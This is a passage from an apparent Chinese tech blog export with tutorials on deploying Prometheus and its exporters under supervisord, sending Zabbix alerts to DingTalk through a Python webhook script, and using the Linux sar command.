    <content><![CDATA[<h2 id="1-下载-Prometheus"><a href="#1-下载-Prometheus" class="headerlink" title="1. 下载 Prometheus"></a>1. 下载 Prometheus</h2><p><a href="https://prometheus.io/download/" target="_blank" rel="noopener">https://prometheus.io/download/</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install net-tools vim superviosr wget  -y</span></pre></td></tr><tr><td class="code"><pre><span class="line">cd /opt/</span></pre></td></tr><tr><td class="code"><pre><span class="line">useradd -s /usr/sbin/nologin prometheus</span></pre></td></tr><tr><td class="code"><pre><span class="line">wget https://github.com/prometheus/prometheus/releases/download/v2.4.3/prometheus-2.4.3.linux-amd64.tar.gz</span></pre></td></tr><tr><td class="code"><pre><span class="line">tar -xvf prometheus-2.4.3.linux-amd64.tar.gz</span></pre></td></tr><tr><td class="code"><pre><span class="line">ln -s prometheus-2.4.3.linux-amd64  prometheus</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">cat &gt; /etc/supervisord.d/prometheus.ini &lt;&lt; EOF</span></pre></td></tr><tr><td class="code"><pre><span class="line">command=/opt/prometheus/prometheus  --storage.tsdb.retention=90d  --config.file=/opt/prometheus/prometheus.yml</span></pre></td></tr><tr><td class="code"><pre><span class="line">user=prometheus</span></pre></td></tr><tr><td class="code"><pre><span class="line">autostart = true</span></pre></td></tr><tr><td class="code"><pre><span class="line">autorestart=true</span></pre></td></tr><tr><td class="code"><pre><span class="line">redirect_stderr=true</span></pre></td></tr><tr><td class="code"><pre><span class="line">directory=/opt/prometheus</span></pre></td></tr><tr><td class="code"><pre><span class="line">stdout_logfile=/opt/prometheus/sprometheus.log</span></pre></td></tr><tr><td class="code"><pre><span class="line">stdout_logfile_maxbytes=20MB</span></pre></td></tr><tr><td class="code"><pre><span class="line">EOF</span></pre></td></tr></table></figure>
<h2 id="2-node"><a href="#2-node" class="headerlink" title="2. node"></a>2. node</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;opt&#x2F;</span></pre></td></tr><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;prometheus&#x2F;node_exporter&#x2F;releases&#x2F;download&#x2F;v0.16.0&#x2F;node_exporter-0.16.0.linux-amd64.tar.gz</span></pre></td></tr><tr><td class="code"><pre><span class="line">tar -xvf node_exporter-0.16.0.linux-amd64.tar.gz</span></pre></td></tr><tr><td class="code"><pre><span class="line">ln -s node_exporter-0.16.0.linux-amd64 node_exporter</span></pre></td></tr></table></figure>
<p><a href="https://github.com/percona/grafana-dashboards" target="_blank" rel="noopener">https://github.com/percona/grafana-dashboards</a></p>
<h2 id="3-监控-MySQL"><a href="#3-监控-MySQL" class="headerlink" title="3. 监控 MySQL"></a>3. 监控 MySQL</h2><p><a href="https://prometheus.io/docs/visualization/grafana/" target="_blank" rel="noopener">https://prometheus.io/docs/visualization/grafana/</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;prometheus&#x2F;mysqld_exporter&#x2F;releases&#x2F;download&#x2F;v0.11.0&#x2F;mysqld_exporter-0.11.0.linux-amd64.tar.gz</span></pre></td></tr></table></figure>
<p>授权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE USER &#39;exporter&#39;@&#39;127.0.0.1&#39; IDENTIFIED BY &#39;3Xporter&#39; WITH MAX_USER_CONNECTIONS 3;</span></pre></td></tr><tr><td class="code"><pre><span class="line">GRANT PROCESS, REPLICATION CLIENT, SELECT ON *.* TO &#39;exporter&#39;@&#39;127.0.0.1&#39;;</span></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">cat &gt; /etc/supervisord.d/prometheus_export.ini &lt;&lt; EOF</span></pre></td></tr><tr><td class="code"><pre><span class="line">[program:p_mysql]</span></pre></td></tr><tr><td class="code"><pre><span class="line">command=/opt/mysqld_exporter/mysqld_exporter</span></pre></td></tr><tr><td class="code"><pre><span class="line">autostart = true</span></pre></td></tr><tr><td class="code"><pre><span class="line">autorestart=true</span></pre></td></tr><tr><td class="code"><pre><span class="line">redirect_stderr=true</span></pre></td></tr><tr><td class="code"><pre><span class="line">stdout_logfile=/dev/stdout</span></pre></td></tr><tr><td class="code"><pre><span class="line">stdout_logfile_maxbytes=0</span></pre></td></tr><tr><td class="code"><pre><span class="line">environment=DATA_SOURCE_NAME='exporter:3Xporter@(localhost:3306)/'</span></pre></td></tr><tr><td class="code"><pre><span class="line">[program:p_os]</span></pre></td></tr><tr><td class="code"><pre><span class="line">command=/opt/node_exporter/node_exporter</span></pre></td></tr><tr><td class="code"><pre><span class="line">autostart = true</span></pre></td></tr><tr><td class="code"><pre><span class="line">autorestart=true</span></pre></td></tr><tr><td class="code"><pre><span class="line">redirect_stderr=true</span></pre></td></tr><tr><td class="code"><pre><span class="line">stdout_logfile=/dev/stdout</span></pre></td></tr><tr><td class="code"><pre><span class="line">stdout_logfile_maxbytes=0</span></pre></td></tr><tr><td class="code"><pre><span class="line">EOF</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">supervisorctl reload</span></pre></td></tr><tr><td class="code"><pre><span class="line">supervisorctl status</span></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Prometheus</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Prometheus</tag>
      </tags>
  </entry>
  <entry>
    <title>zabbix 钉钉报警脚本</title>
    <url>/2019/01/zabbix_dingding/</url>
    <content><![CDATA[<h1 id="添加告警媒介"><a href="#添加告警媒介" class="headerlink" title="添加告警媒介"></a>添加告警媒介</h1><h2 id="脚本配置"><a href="#脚本配置" class="headerlink" title="脚本配置"></a>脚本配置</h2><p>打开钉钉机器人 添加机器人 自定义机器人</p>
<p><img src="/2019/01/zabbix_dingding/dingding_robot.png" alt="dingding_robot"></p>
<p>登录zabbix服务器查看zabbix 报警脚本的位置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/zabbix/zabbix_server.conf |grep AlertScriptsPath</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## Option: AlertScriptsPath</span></span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> AlertScriptsPath=<span class="variable">$&#123;datadir&#125;</span>/zabbix/alertscripts</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">AlertScriptsPath=/usr/lib/zabbix/alertscripts</span></pre></td></tr></table></figure>
<p>放入zabbix报警脚本路径</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /usr/lib/zabbix/alertscripts/test_ddmkrobot.py</span></pre></td></tr></table></figure>
<p><a href="/downloads/test_ddmkrobot.py">点击下载</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment"># @File  : test.py</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment"># @Author: becivells</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">#@Contact : becivells@gmail.com</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment"># @Date  : 2018/9/27</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">#@Software : PyCharm</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment"># @Desc  :zabbix 告警 仅仅支持markdown</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">--webhook=dingding webhook</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">--sendto=&#123;ALERT.SENDTO&#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">--subject=&#123;ALERT.SUBJECT&#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">--message=&#123;ALERT.MESSAGE&#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">--log=dingding.log</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string"></span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string"></span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">测试</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">--webhook=https://oapi.dingtalk.com/robot/send?access_token=&amp;+*****  --sendto=tel --subject=test --message="**hehe**" --log test.log</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string"></span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">服务器:&#123;HOST.NAME&#125;发生: &#123;TRIGGER.NAME&#125;故障!</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string"></span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">**告警主机:** &#123;HOST.NAME&#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">**告警地址:** &#123;HOST.IP&#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">**告警时间:** &#123;EVENT.DATE&#125; &#123;EVENT.TIME&#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">**监控项目:** &#123;ITEM.NAME&#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">**监控取值:** &#123;ITEM.LASTVALUE&#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">**告警等级:** &#123;TRIGGER.SEVERITY&#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">**当前状态:** &#123;TRIGGER.STATUS&#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">**告警信息:** &#123;TRIGGER.NAME&#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">**确认状态:** &#123;EVENT.ACK.STATUS&#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">**事件ID:** &#123;EVENT.ID&#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string"></span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string"></span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">&#123;TRIGGER.STATUS&#125;: &#123;TRIGGER.NAME&#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string"></span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">**## 故障恢复提示**</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">**事件名称:** &#123;TRIGGER.NAME&#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">**事件状态:** &#123;TRIGGER.STATUS&#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">**事件等级:** &#123;TRIGGER.SEVERITY&#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">**事件ID:** &#123;EVENT.ID&#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">**事件链接:** &#123;TRIGGER.URL&#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string"></span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">**事件列表:**</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">1. &#123;ITEM.NAME1&#125;(&#123;HOST.NAME1&#125;:&#123;ITEM.KEY1&#125;): &#123;ITEM.VALUE1&#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">2. &#123;ITEM.NAME2&#125;(&#123;HOST.NAME2&#125;:&#123;ITEM.KEY2&#125;): &#123;ITEM.VALUE2&#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">3. &#123;ITEM.NAME3&#125;(&#123;HOST.NAME3&#125;:&#123;ITEM.KEY3&#125;): &#123;ITEM.VALUE3&#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_cmd_args</span><span class="params">()</span>:</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="string">'''处理命令行选项</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">    '''</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    parser = argparse.ArgumentParser(</span></pre></td></tr><tr><td class="code"><pre><span class="line">        prog=<span class="string">'dingding robot'</span>,</span></pre></td></tr><tr><td class="code"><pre><span class="line">        description=<span class="string">'dingidng robot send message for zabbix'</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    parser.add_argument(<span class="string">"--webhook"</span>, dest=<span class="string">'webhook'</span>,</span></pre></td></tr><tr><td class="code"><pre><span class="line">                        action=<span class="string">"store"</span>,required=<span class="literal">True</span>,</span></pre></td></tr><tr><td class="code"><pre><span class="line">                        help=<span class="string">"dingding webhook"</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    parser.add_argument(<span class="string">"--sendto"</span>, dest=<span class="string">'sendto'</span>,</span></pre></td></tr><tr><td class="code"><pre><span class="line">                        action=<span class="string">"store"</span>,required=<span class="literal">True</span>,</span></pre></td></tr><tr><td class="code"><pre><span class="line">                        help=<span class="string">"msg sendto"</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    parser.add_argument(<span class="string">"--subject"</span>, dest=<span class="string">'subject'</span>,</span></pre></td></tr><tr><td class="code"><pre><span class="line">                        action=<span class="string">"store"</span>,required=<span class="literal">True</span>,</span></pre></td></tr><tr><td class="code"><pre><span class="line">                        help=(<span class="string">"mesage title"</span>))</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    parser.add_argument(<span class="string">"--message"</span>, action=<span class="string">"store"</span>,</span></pre></td></tr><tr><td class="code"><pre><span class="line">                        required=<span class="literal">True</span>,dest=<span class="string">'message'</span>,</span></pre></td></tr><tr><td class="code"><pre><span class="line">                        help=<span class="string">"send message"</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    parser.add_argument(<span class="string">"--log"</span>, action=<span class="string">"store"</span>,required=<span class="literal">True</span>,</span></pre></td></tr><tr><td class="code"><pre><span class="line">                       dest=<span class="string">'log'</span>,help=<span class="string">"log save path"</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    args = parser.parse_args()</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">return</span> args</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dingding_markdown_msg</span><span class="params">(webhook,sendto,subject,message)</span>:</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="string">'''钉钉markdown格式消息报警'''</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/json;charset=utf-8'</span>&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    json_text= &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">     <span class="string">"msgtype"</span>: <span class="string">"markdown"</span>,</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="string">"at"</span>: &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="string">"atMobiles"</span>: [</span></pre></td></tr><tr><td class="code"><pre><span class="line">                sendto</span></pre></td></tr><tr><td class="code"><pre><span class="line">            ],</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="string">"isAtAll"</span>: <span class="literal">False</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125;,</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="string">"markdown"</span>: &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="string">"title"</span>:subject,</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="string">"text"</span>: message</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">try</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">        info = requests.post(webhook,json.dumps(json_text),headers=headers).content</span></pre></td></tr><tr><td class="code"><pre><span class="line">        logging.info(<span class="string">'sendto: %s,subject: %s,message: %s,info: %s'</span>%</span></pre></td></tr><tr><td class="code"><pre><span class="line">                     (sendto,subject,message,info))</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span></pre></td></tr><tr><td class="code"><pre><span class="line">        logging.error(<span class="string">'sendto: %s,subject: %s,message: %s,info: %s'</span>%</span></pre></td></tr><tr><td class="code"><pre><span class="line">                      (sendto,subject,message,str(e)))</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">    args_msg = parse_cmd_args()</span></pre></td></tr><tr><td class="code"><pre><span class="line">    log_path = <span class="string">'/tmp/'</span>+ os.path.basename(args_msg.log)</span></pre></td></tr><tr><td class="code"><pre><span class="line">    logging.basicConfig(level=logging.DEBUG,</span></pre></td></tr><tr><td class="code"><pre><span class="line">                        format=<span class="string">'%(asctime)s %(thread)d %(filename)s[line:%(lineno)d] %(levelname)s %(message)s'</span>,</span></pre></td></tr><tr><td class="code"><pre><span class="line">                        datefmt=<span class="string">'%a, %d %b %Y %H:%M:%S'</span>,</span></pre></td></tr><tr><td class="code"><pre><span class="line">                        filename=log_path,</span></pre></td></tr><tr><td class="code"><pre><span class="line">                        filemode=<span class="string">'a'</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">                        )</span></pre></td></tr><tr><td class="code"><pre><span class="line">    dingding_markdown_msg(args_msg.webhook,args_msg.sendto,</span></pre></td></tr><tr><td class="code"><pre><span class="line">                          args_msg.subject,args_msg.message)</span></pre></td></tr></table></figure>
<p>登录zabbix web端</p>
<p>管理 &gt;&gt; 报警媒介类型 &gt;&gt; 创建媒体类型</p>
<p><img src="/2019/01/zabbix_dingding/zabbix报警.png" alt="zabbix报警"></p>
<p><img src="/2019/01/zabbix_dingding/创建报警.png" alt="创建报警"></p>
<h2 id="触发后脚本要发送的消息格式"><a href="#触发后脚本要发送的消息格式" class="headerlink" title="触发后脚本要发送的消息格式"></a>触发后脚本要发送的消息格式</h2><p><img src="/2019/01/zabbix_dingding/创建动作.png" alt="创建动作"></p>
<p><img src="/2019/01/zabbix_dingding/创建报警动作.png" alt="创建报警动作"></p>
<p><img src="/2019/01/zabbix_dingding/添加触发条件.png" alt="添加触发条件"></p>
<p><img src="/2019/01/zabbix_dingding/报警动作操作.png" alt="报警动作操作"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">服务器:&#123;HOST.NAME&#125;发生: &#123;TRIGGER.NAME&#125;故障!</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">**告警主机:** &#123;HOST.NAME&#125;   </span></pre></td></tr><tr><td class="code"><pre><span class="line">**告警地址:** &#123;HOST.IP&#125;   </span></pre></td></tr><tr><td class="code"><pre><span class="line">**告警时间:** &#123;EVENT.DATE&#125; &#123;EVENT.TIME&#125;   </span></pre></td></tr><tr><td class="code"><pre><span class="line">**监控项目:** &#123;ITEM.NAME&#125;   </span></pre></td></tr><tr><td class="code"><pre><span class="line">**监控取值:** &#123;ITEM.LASTVALUE&#125;   </span></pre></td></tr><tr><td class="code"><pre><span class="line">**告警等级:** &#123;TRIGGER.SEVERITY&#125;   </span></pre></td></tr><tr><td class="code"><pre><span class="line">**当前状态:** &#123;TRIGGER.STATUS&#125;   </span></pre></td></tr><tr><td class="code"><pre><span class="line">**告警信息:** &#123;TRIGGER.NAME&#125;   </span></pre></td></tr><tr><td class="code"><pre><span class="line">**确认状态:** &#123;EVENT.ACK.STATUS&#125;   </span></pre></td></tr><tr><td class="code"><pre><span class="line">**事件ID:** &#123;EVENT.ID&#125;</span></pre></td></tr></table></figure>
<p><img src="/2019/01/zabbix_dingding/操作新的.png" alt="操作新的"></p>
<p><img src="/2019/01/zabbix_dingding/告警操作.png" alt="告警操作"></p>
<p>1-1 报警一次 1-0 一直报警 不断的发消息。持续的发消息</p>
<h2 id="恢复后脚本要发送的消息格式"><a href="#恢复后脚本要发送的消息格式" class="headerlink" title="恢复后脚本要发送的消息格式"></a>恢复后脚本要发送的消息格式</h2><p><img src="/2019/01/zabbix_dingding/恢复操作.png" alt="恢复操作"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;TRIGGER.STATUS&#125;: &#123;TRIGGER.NAME&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"># **故障恢复提示**    </span></pre></td></tr><tr><td class="code"><pre><span class="line">**事件名称:** &#123;TRIGGER.NAME&#125;   </span></pre></td></tr><tr><td class="code"><pre><span class="line">**事件状态:** &#123;TRIGGER.STATUS&#125;   </span></pre></td></tr><tr><td class="code"><pre><span class="line">**事件等级:** &#123;TRIGGER.SEVERITY&#125;   </span></pre></td></tr><tr><td class="code"><pre><span class="line">**事件ID:** &#123;EVENT.ID&#125;   </span></pre></td></tr><tr><td class="code"><pre><span class="line">**事件链接:** &#123;TRIGGER.URL&#125;   </span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">**事件列表:**    </span></pre></td></tr><tr><td class="code"><pre><span class="line">1. &#123;ITEM.NAME1&#125;(&#123;HOST.NAME1&#125;:&#123;ITEM.KEY1&#125;): &#123;ITEM.VALUE1&#125;</span></pre></td></tr></table></figure>
<p>到此报警消息还是发不出去的。用户需要增加报警信息</p>
<h2 id="为用户添加告警媒介"><a href="#为用户添加告警媒介" class="headerlink" title="为用户添加告警媒介"></a>为用户添加告警媒介</h2><p><img src="/2019/01/zabbix_dingding/用户报警媒介添加.png" alt="用户报警媒介添加"></p>
<p>关掉一台服务器看看</p>
<p><img src="/2019/01/zabbix_dingding/微信图片_20180928094226.jpg" alt="微信图片_20180928094226"></p>
<p>最后测试报警信息和恢复信息是否能正常发送，如果发送不成功请查看错误日志。消息未发送有可能是钉钉脚本日志问题。检查权限是否为zabbix用户</p>
]]></content>
      <categories>
        <category>zabbix</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>zabbix</tag>
        <tag>钉钉</tag>
      </tags>
  </entry>
  <entry>
    <title>linux sar</title>
    <url>/2017/07/linux-sar/</url>
    <content><![CDATA[<h1 id="Linux-命令sar的用法"><a href="#Linux-命令sar的用法" class="headerlink" title="Linux 命令sar的用法"></a>Linux 命令sar的用法</h1><p>SAR是系统活动报告(System Activity Report)英文单词的首字母缩写。正如它的名字所表示的那样，SAR是一个在Unix和Linux操作系统中用来收集、报告和保存CPU、内存、输入输出端口使用情况的命令。SAR命令可以动态产生报告，也可以把报告保存在日志文件中。</p>
<p>安装如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install sysstat</span></pre></td></tr></table></figure>
<ul>
<li>iostat 工具提供CPU使用率及硬盘吞吐效率的数据；</li>
<li>mpstat 工具提供单个处理器或多个处理器相关数据；</li>
<li>sar 工具负责收集、报告并存储系统活跃的信息；</li>
<li>sa1 工具负责收集并存储每天系统动态信息到一个二进制的文件中。它是通过计划任务工具cron来运行，</li>
</ul>
<ul>
<li>sa2 工具负责把每天的系统活跃性息写入总结性的报告中。它是为sar所设计的前端 ，要通过cron来调用</li>
<li>sadc 是系统动态数据收集工具，收集的数据被写一个二进制的文件中，它被用作sar工具的后端；</li>
<li>sadf 显示被sar通过多种格式收集的数据；</li>
</ul>
<p>启动sadc(system activity data collector)服务(sysstat)，这样报告就会被写入到日志文件“/var/log/sa/saDD”中并且已经存在的文档将会被归档。DD表示当前日期</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">[root@localhost ~]# systemctl start sysstat</span></pre></td></tr><tr><td class="code"><pre><span class="line">[root@localhost ~]# systemctl enable sysstat</span></pre></td></tr></table></figure>
<p>它每隔10分钟收集一次数据并且每天形成一份报告。下图中的crontab文件负责收集和生成报告。</p>
<p><img src="/2017/07/linux-sar/pasted_image001.png" alt="pasted_image001"></p>
<p>下图中的是SysStat的Config文件。(sar命令)</p>
<p><img src="/2017/07/linux-sar/pasted_image.png" alt="pasted_image"></p>
<p>sar命令常用格式<br>sar [options] [-A] [-o file] t [n]</p>
<p>其中：</p>
<p>t为采样间隔，n为采样次数，默认值是1；</p>
<p>-o file表示将命令结果以二进制格式存放在文件中，file 是文件名。</p>
<p>options 为命令行选项，sar命令常用选项如下：</p>
<p>-A：所有报告的总和</p>
<p>-u：输出CPU使用情况的统计信息</p>
<p>-v：输出inode、文件和其他内核表的统计信息</p>
<p>-d：输出每一个块设备的活动信息</p>
<p>-r：输出内存和交换空间的统计信息</p>
<p>-b：显示I/O和传送速率的统计信息</p>
<p>-a：文件读写情况</p>
<p>-c：输出进程统计信息，每秒创建的进程数</p>
<p>-R：输出内存页面的统计信息</p>
<p>-y：终端设备活动情况</p>
<p>-b：报告I/O使用情况以及传输速率。（只适用于2.5及之前的内核，所以新内核有可能不支持这个选项）</p>
<p>-B：报告“页”使用情况</p>
<p>-d：报告每一个块设备的使用情况<br>（当你使用时，你会发现在DEV列有类似dev1-7格式的字符串，<br>其中1代表设备的主序号，n代表设备的从序号，<br>而且rd_sec/s列和wr_sec/s列的单位都是512bytes，也就是512B，也就是0.5KB）</p>
<p>-I：汇报中断情况</p>
<p>-n：汇报网络情况</p>
<p>-P：设定CPU</p>
<p>-q：汇报队列长度和负载信息</p>
<p>-R：汇报内存情况</p>
<p>-u：汇报CPU使用情况</p>
<p>-v：汇报i节点、文件和其他内核表信息</p>
<p>-w：汇报系统上下文切换情况</p>
<p>-x：可以针对某个特定PID给出统计信息，<br>可以直接指定进程ID号；<br>也可以指定为SELF，这样就是检测sar进程本身；<br>如果设定为ALL，则表示汇报所有系统进程信息。</p>
<p>-X：汇报特定PID的子进程的信息</p>
<p>-y：设定TTY设备的信息。</p>
<p><strong>CPU资源监控</strong></p>
<h2 id="sar-2-5"><a href="#sar-2-5" class="headerlink" title="sar 2 5"></a>sar 2 5</h2><p><img src="/2017/07/linux-sar/pasted_image004.png" alt="pasted_image004"></p>
<p><strong>查看每个核心的</strong></p>
<h2 id="sar-P-ALL-1-2"><a href="#sar-P-ALL-1-2" class="headerlink" title="sar -P ALL 1 2"></a>sar -P ALL 1 2</h2><p><img src="/2017/07/linux-sar/pasted_image014.png" alt="pasted_image014"></p>
<p>屏幕显示如下：</p>
<p>17:06:16 CPU %user %nice %system %iowait %steal %idle</p>
<p>17:06:26 all 0.00 0.00 0.20 0.00 0.00 99.80</p>
<p>17:06:36 all 0.00 0.00 0.20 0.00 0.00 99.80</p>
<p>17:06:46 all 0.00 0.00 0.10 0.00 0.00 99.90</p>
<p>Average: all 0.00 0.00 0.17 0.00 0.00 99.83</p>
<p>输出项说明：</p>
<p>CPU：all 表示统计信息为所有 CPU 的平均值。</p>
<p>%user：显示在用户级别(application)运行使用 CPU 总时间的百分比。</p>
<p>%nice：显示在用户级别，用于nice操作，所占用 CPU 总时间的百分比。</p>
<p>%system：在核心级别(kernel)运行所使用 CPU 总时间的百分比。</p>
<p>%iowait：显示用于等待I/O操作占用 CPU 总时间的百分比。</p>
<p>%steal：管理程序(hypervisor)为另一个虚拟进程提供服务而等待虚拟 CPU 的百分比。</p>
<p>%idle：显示 CPU 空闲时间占用 CPU 总时间的百分比。</p>
<ol>
<li>若 %iowait 的值过高，表示硬盘存在I/O瓶颈</li>
</ol>
<ol>
<li>若 %idle 的值高但系统响应慢时，有可能是 CPU 等待分配内存，此时应加大内存容量</li>
</ol>
<ol>
<li>若 %idle 的值持续低于1，则系统的 CPU 处理能力相对较低，表明系统中最需要解决的资源是 CPU 。</li>
</ol>
<p>如果要查看二进制文件test中的内容，需键入如下sar命令：</p>
<p>sar -u -f test</p>
<ol>
<li>inode、文件和其他内核表监控</li>
</ol>
